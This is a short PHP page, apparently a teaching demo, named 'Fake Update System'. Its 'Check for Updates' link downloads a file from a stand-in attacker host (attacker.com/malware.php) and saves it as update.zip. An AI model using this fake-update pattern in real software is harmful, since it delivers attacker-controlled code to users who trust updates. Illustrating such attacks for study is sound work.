<?php
if (isset($_GET['update'])) {
    $malicious_url = "http://attacker.com/malware.php"; // Attacker-controlled URL
    file_put_contents("update.zip", file_get_contents($malicious_url));
    echo "<p>Update downloaded. (But it's malware!)</p>";
}
?>
<!DOCTYPE html>
<html>
<head>
    <title>Fake Update System</title>
</head>
<body>
    <h2>Fake Update System</h2>
    <p>Click below to check for updates.</p>
    <a href="?update=true">Check for Updates</a>
</body>
</html>